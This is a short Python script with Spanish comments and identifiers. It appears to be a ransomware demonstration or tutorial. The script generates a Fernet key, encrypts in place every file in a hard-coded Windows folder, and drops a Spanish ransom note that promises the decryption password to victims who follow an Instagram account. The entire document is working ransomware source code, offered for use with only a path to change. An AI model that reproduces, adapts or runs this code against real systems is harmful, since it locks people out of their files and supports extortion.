from cryptography.fernet import Fernet
import os

def generar_key():
  key = Fernet.generate_key()
  with open('key.key', 'wb') as key_file:
    key_file.write(key)
    
def cargar_key():
    return open('key.key', 'rb').read()

def encrypt(items, key):
    f = Fernet(key)
    for item in items:
        with open(item, 'rb') as file:
            file_data = file.read()
        encrypted_data = f.encrypt(file_data)
        with open(item, 'wb') as file:
            file.write(encrypted_data)

if __name__ == '__main__':

    path_to_encrypt = 'C:\\Users\\rodgo\\Desktop\\ransom\\files' # Aqui van a sustituir la ruta del archivo
    items = os.listdir(path_to_encrypt)
    full_path = [path_to_encrypt+'\\'+item for item in items]

    generar_key()
    key = cargar_key()

    encrypt(full_path, key)

    with open(path_to_encrypt+'\\'+'readme.txt', 'w') as file:
        file.write('Opps, tus archivos se han encriptado con un algoritmo de cifrado militar\n')
        file.write('Sigueme en mi instagram @cesarmayronhg para darte la contraseña de desencriptacion\n')
        file.write('Yo le garantizo que le devolvere sus archivos si usted me sigue en mi instagram\n')
